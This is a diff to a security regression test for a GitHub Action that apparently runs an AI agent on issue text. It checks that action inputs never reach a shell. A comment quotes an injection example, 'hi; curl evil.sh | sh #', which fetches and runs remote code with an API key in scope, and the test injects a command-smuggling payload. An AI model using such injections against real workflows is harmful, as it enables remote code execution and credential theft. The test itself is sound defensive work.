@@ -1,6 +1,6 @@
 import { productEnvironment } from '../../../packages/product-config/src/__tests__/product-environment.js';
 /**
- * SEC-006 — `task` (and every other action input) is untrusted: the documented use of this action is
+ * `task` (and every other action input) is untrusted: the documented use of this action is
  * `task: ${{ github.event.issue.body }}`, i.e. text an arbitrary GitHub user wrote. The action used to
  * run `execSync(args.join(' '))`, which hands the joined string to `/bin/sh`, so an issue body of
  * `hi; curl evil.sh | sh #` executed on the runner with the repo's `ANTHROPIC_API_KEY` in scope.
@@ -28,9 +28,9 @@ import { runCli } from '../src/node-io.mjs';
 const MARKER_NAME = 'PWNED';
 const PAYLOAD = `hello; touch ${MARKER_NAME} #`;
 
-const ARGS = { model: '', output: 'text', maxTurns: '', loadProject: false };
+const ARGS = { model: '', output: 'text', maxTurns: '' };
 
-describe('SEC-006: action inputs must never reach a shell', () => {
+describe('action inputs must never reach a shell', () => {
   let dir: string;
   let marker: string;
 
